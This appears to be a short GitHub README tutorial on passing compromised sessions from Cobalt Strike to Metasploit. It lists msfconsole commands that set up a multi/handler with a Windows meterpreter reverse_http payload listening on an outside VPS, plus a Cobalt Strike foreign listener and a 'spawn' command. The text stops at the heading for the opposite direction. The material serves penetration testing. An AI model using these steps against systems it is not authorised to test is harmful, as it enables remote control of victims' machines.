## Penetration testing & MSF linked with CobaltStrike<br>

## CobaltStrike->MSF<br>

Run `msfconsole` to start listening.<br>

<br>
msfconsole<br>
use exploit/multi/handler<br>
set payload windows/meterpreter/reverse_http<br>
set lhost vps_ip<br>
set lport 44444<br>
set lhost vps_ip set lport 44444<br>


<img width="1174" alt="1" src="https://github.com/sec13b/Penetration-testing-MSF-linked-with-CobaltStrike/assets/123419537/25a7233e-f8d0-4f72-b06d-1e155b2b2e63"><br><br>


Next `CobaltStrike` creates an external listener with `Host` and `Port` as `lhost` and `lport`.<br><br>

<img width="1467" alt="2" src="https://github.com/sec13b/Penetration-testing-MSF-linked-with-CobaltStrike/assets/123419537/6a85b464-83fe-4f35-8681-5f6b2ee4da50"><br><br>


Next the session is spawned over, the command `spawn 105-msf` is executed on the `CobaltStrike` console, and `msf` receives that the spawned session went live successfully.<br><br>

 

<img width="1467" alt="3" src="https://github.com/sec13b/Penetration-testing-MSF-linked-with-CobaltStrike/assets/123419537/cf361455-c336-4ab0-834e-d6d5d7df8ebf"><br><br>


## MSF->CobaltStrike
